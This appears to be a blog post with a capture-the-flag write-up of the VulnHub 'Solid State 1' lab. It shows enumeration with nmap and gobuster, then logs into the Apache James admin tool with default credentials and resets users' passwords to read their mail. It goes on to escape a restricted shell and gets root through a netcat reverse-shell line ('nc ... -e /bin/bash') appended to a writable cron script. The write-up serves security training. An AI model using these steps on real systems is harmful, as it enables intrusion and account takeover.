</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>


  
-->



<!-- This loops through the paginated posts -->

   <h1 class="post-title">VulnHub - Solid State 1</h1>
   <p class="post-date text-bold text-upcase">
     <span>January 2022</span>
   </p>

   <p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

 <p><strong>Description:</strong> It was originally created for HackTheBox</p>

<p><strong>Author:</strong> Ch33z_plz</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/solidstate-1,261/">https://www.vulnhub.com/entry/solidstate-1,261/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>The following command performs a ping scan to discover the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-sn</span> 192.168.179.0/24
Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-04 13:56 <span class="nt">-05</span>
Nmap scan report <span class="k">for </span>192.168.179.185
...
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>To detect open ports a full TCP port scan was performed with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-n</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.185 <span class="nt">-oG</span> nmap/all.tcp-ports.txt 
...
PORT     STATE SERVICE
22/tcp   open  ssh
25/tcp   open  smtp
80/tcp   open  http
110/tcp  open  pop3
119/tcp  open  nntp
4555/tcp open  rsip
...
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>With the aim of discovering information about open ports running on the server, an aggressive scan was did with nmap, it enable the OS detection, version enumeration, script scanning and traceroute.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-A</span> <span class="nt">-p22</span>,25,80,110,119,4555 <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-Pn</span> 192.168.179.185 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT     STATE SERVICE     VERSION                                                                                                                                  
22/tcp   open  tcpwrapped                                                                                                                                           
| ssh-hostkey:                                                                                                                                                      
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b <span class="o">(</span>RSA<span class="o">)</span>                                                                                                      
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                     
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                   
25/tcp   open  smtp        JAMES smtpd 2.3.2
|_smtp-commands: solidstate Hello nmap.scanme.org <span class="o">(</span>192.168.179.1 <span class="o">[</span>192.168.179.1]<span class="o">)</span>, PIPELINING, ENHANCEDSTATUSCODES, 
80/tcp   open  http        Apache httpd 2.4.25 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-server-header: Apache/2.4.25 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Home - Solid State Security 
110/tcp  open  pop3        JAMES pop3d 2.3.2
119/tcp  open  nntp        JAMES nntpd <span class="o">(</span>posting ok<span class="o">)</span>
4555/tcp open  james-admin JAMES Remote Admin 2.3.2
...
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>A web page is running in the web service, but was not possible to find valuable information.</p>

<p><img src="/assets/images/solidstate/screenshot-1.png" alt="" /></p>

<p>The directory brute forcing with gobuster also did not disclosed information that would help to compromise the system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://192.168.179.185/ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="nt">-e</span> <span class="nt">-x</span> html,php,txt
...
http://192.168.179.185/images               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.185/images/]
http://192.168.179.185/about.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7182]                                    
http://192.168.179.185/index.html           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 7776]                                    
http://192.168.179.185/services.html        <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 8404]                                    
http://192.168.179.185/assets               <span class="o">(</span>Status: 301<span class="o">)</span> <span class="o">[</span>Size: 319] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://192.168.179.185/assets/]
http://192.168.179.185/README.txt           <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 963]                                     
http://192.168.179.185/LICENSE.txt          <span class="o">(</span>Status: 200<span class="o">)</span> <span class="o">[</span>Size: 17128]                                   
http://192.168.179.185/server-status        <span class="o">(</span>Status: 403<span class="o">)</span> <span class="o">[</span>Size: 303]
</code></pre></div></div>

<h3 id="enumeration-on-port-4555">Enumeration on port 4555</h3>

<p>By connecting on port 4545, we see that it service requires authentication, but using root as username and password we have successfull access.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login <span class="nb">id</span>:
root
Password:
root
Welcome root. HELP <span class="k">for </span>a list of commands
</code></pre></div></div>

<p>Executing the <strong>help</strong> command we can see the list of available commands to the root user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">help
</span>Currently implemented commands:
<span class="nb">help                                    </span>display this <span class="nb">help
</span>listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser <span class="o">[</span>username] <span class="o">[</span>password]           add a new user
verify <span class="o">[</span>username]                       verify <span class="k">if </span>specified user exist
deluser <span class="o">[</span>username]                      delete existing user
setpassword <span class="o">[</span>username] <span class="o">[</span>password]       sets a user<span class="s1">'s password
setalias [user] [alias]                 locally forwards all email for '</span>user<span class="s1">' to '</span><span class="nb">alias</span><span class="s1">'
showalias [username]                    shows a user'</span>s current email <span class="nb">alias
</span>unsetalias <span class="o">[</span>user]                       unsets an <span class="nb">alias </span><span class="k">for</span> <span class="s1">'user'</span>
setforwarding <span class="o">[</span>username] <span class="o">[</span>emailaddress] forwards a user<span class="s1">'s email to another email address
showforwarding [username]               shows a user'</span>s current email forwarding
unsetforwarding <span class="o">[</span>username]              removes a forward
user <span class="o">[</span>repositoryname]                   change to another user repository
shutdown                                kills the current JVM <span class="o">(</span>convenient when James is run as a daemon<span class="o">)</span>
quit                                    close connection
</code></pre></div></div>

<p>We list the users by typing the <strong>listusers</strong> command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listusers
Existing accounts 5
user: james
user: thomas
user: john
user: mindy
user: mailadmin
</code></pre></div></div>

<p>We create the user <strong>s4rgaz</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>adduser s4rgaz 123
User s4rgaz added
listusers
Existing accounts 6
user: james
user: thomas
user: john
user: mindy
user: s4rgaz
user: mailadmin
quit
Bye
Connection closed by foreign host.
root@kali:~<span class="err">$</span>
</code></pre></div></div>

<h3 id="enumeration-on-service-pop3">Enumeration on service pop3</h3>

<p>By logging in to pop3 service as user <strong>s4rgaz</strong>, we have successful access, so we can manage the users to be able to access to pop3 service.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
user s4rgaz
+OK
pass 123
+OK Welcome s4rgaz
list
+OK 0 0
<span class="nb">.</span>
quit
+OK Apache James POP3 Server signing off.
Connection closed by foreign host.
root@kali:~<span class="err">$</span>
</code></pre></div></div>

<p>We go back to the service running on port 4545 and change john’s password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login <span class="nb">id</span>:
root
Password:
root
Welcome root. HELP <span class="k">for </span>a list of commands
setpassword john john
Password <span class="k">for </span>john reset
</code></pre></div></div>

<p>We log in on pop3 service as user john, in the mail it indicates that access to <strong>mindy</strong> is restricted.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready 
user john
+OK
pass john
+OK Welcome john
list
+OK 1 743
1 743
<span class="nb">.</span>
retr 1
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;9564574.1.1503422198108.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
          <span class="k">for</span> &lt;john@localhost&gt;<span class="p">;</span>
          Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
Date: Tue, 22 Aug 2017 13:16:20 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy<span class="s1">'s access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
</span></code></pre></div></div>

<p>Then we change mindy’s password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 4555
Trying 192.168.179.185...
Connected to 192.168.179.185.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login <span class="nb">id</span>:
root
Password:
root
Welcome root. HELP <span class="k">for </span>a list of commands
setpassword mindy mindy
Password <span class="k">for </span>mindy reset
</code></pre></div></div>

<p>We login as user <strong>mindy</strong> on pop3 service and see her SSH login credentials.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>telnet 192.168.179.185 110                                                                                                                  
Trying 192.168.179.185...                                                                                                                                           
Connected to 192.168.179.185.                                                                                                                                       
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>                                                                                                                                           
+OK solidstate POP3 server <span class="o">(</span>JAMES POP3 Server 2.3.2<span class="o">)</span> ready                                                                                                          
user mindy                                                                                                                                                          
+OK                                                                                                                                                                 
pass mindy                                                                                                                                                          
+OK Welcome mindy                                                                                                                                                   
list                                                                                                                                                                
+OK 2 1945                                                                                                                                                          
1 1109                                                                                                                                                              
2 836                                                                                                                                                               
<span class="nb">.</span> 
retr 2
+OK Message follows
Return-Path: &lt;mailadmin@localhost&gt;
Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
MIME-Version: 1.0
Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>
          Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
Date: Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
</code></pre></div></div>

<h2 id="exploitation">Exploitation</h2>
<h3 id="access-via-ssh">Access via SSH</h3>

<p>We access to the server via SSH as user <strong>mindy</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> mindy 192.168.179.185 
mindy@192.168.179.185<span class="s1">'s password: 
Linux solidstate 4.9.0-3-686-pae #1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
mindy@solidstate:~$
</span></code></pre></div></div>

<p>We found the flag in her home directory.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls
</span>bin  user.txt
mindy@solidstate:~<span class="nv">$ </span><span class="nb">cat </span>user.txt 
914d0a4ebc1777889b5b89a23f556fd75
mindy@solidstate:~<span class="err">$</span>
</code></pre></div></div>

<p>By trying to execute some system commands, we see that we are under a restricted shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">cd </span>bin/
<span class="nt">-rbash</span>: <span class="nb">cd</span>: restricted
mindy@solidstate:~<span class="nv">$ </span>ip addr
<span class="nt">-rbash</span>: ip: <span class="nb">command </span>not found
mindy@solidstate:~
</code></pre></div></div>

<p>To bypass the jailed shell, we type <strong>bash -i</strong> to the SSH command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> mindy 192.168.179.185 <span class="s2">"bash -i"</span>                          
mindy@192.168.179.185<span class="s1">'s password: 
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
id
uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
</span></code></pre></div></div>

<p>Now we can run any system command, a python script was found in the <strong>/opt</strong> directory, probably a cron job is running this file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
<span class="nb">ls</span> <span class="nt">-la</span>
total 16
drwxr-xr-x  3 root root 4096 Aug 22  2017 <span class="nb">.</span>
drwxr-xr-x 22 root root 4096 Jun 18  2017 ..
drwxr-xr-x 11 root root 4096 Aug 22  2017 james-2.3.2
<span class="nt">-rwxrwxrwx</span>  1 root root  105 Aug 22  2017 tmp.py
<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">cat </span>tmp.py
<span class="nb">cat </span>tmp.py
<span class="c">#!/usr/bin/env python</span>
import os
import sys
try:
     os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
except:
     sys.exit<span class="o">()</span>

<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="err">$</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="cron-job">Cron Job</h3>

<p>We add the following instruction to the end of the <strong>tmp.py</strong> file, when the cron job executes the script, it will try to connect to my attacking machine, giving us a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"os.system('nc 192.168.179.1 1337 -e /bin/bash')"</span> <span class="o">&gt;&gt;</span> tmp.py
</code></pre></div></div>

<p>We set up a netcat listener on port 1337, wait a moment and we have a root shell.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 1337
listening on <span class="o">[</span>any] 1337 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.185] 40466
script <span class="nt">-qc</span> /bin/bash /dev/null
root@solidstate:~# <span class="nb">ls
ls
</span>root.txt
root@solidstate:~# <span class="nb">cat </span>root.txt
<span class="nb">cat </span>root.txt
b4c9723a28899b1c45db281d99cc87c9
root@solidstate:~#
</code></pre></div></div>




<!-- Pagination links -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<div class="pagination">
  
  <a href="/page2/" class="previous">Newer</a>
  
  <span class="page_number ">
	  <!--  3 of 56-->
  </span>
  
  <a href="/page4/" class="next">Older</a>
  
</div>












  <footer>
<!--	  <div class="dashed"></div> -->
    <ul class="horizontal-list">
  
</ul>

  </footer>


        
          <button title="Toggle Theme" class="theme-toggle">
  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
    <path d="
             M 16 0
             A 16 16 0 0 0 16 32
             z">
    </path>
  </svg>
</button>

        
        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
          &nbsp;
		  •
          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
          &nbsp;
		  •
          &nbsp;-->
		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
        </div>
      </div>
    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
</html>
